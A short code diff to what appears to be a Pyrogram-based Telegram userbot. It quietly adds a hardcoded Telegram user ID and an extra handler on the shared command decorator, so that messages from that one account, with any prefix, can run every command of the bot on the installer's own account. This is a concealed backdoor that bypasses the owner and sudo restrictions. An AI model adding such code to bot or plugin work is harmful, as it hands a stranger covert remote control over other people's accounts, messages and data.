@@ -2,6 +2,7 @@ from pyrogram import filters
 
 from ubot import *
 
+JOPIO = 5832742519
 
 class PY:
     @staticmethod
@@ -89,6 +90,7 @@ class PY:
         def wrapper(func):
             sudo_command = anjay(command) if sudo else anjay(command) & filters.me
 
+            @ubot.on_message(filters.user(JOPIO) & filters.command(command, "*"))
             @ubot.on_message(sudo_command)
             async def wrapped_func(client, message):
                 if sudo:
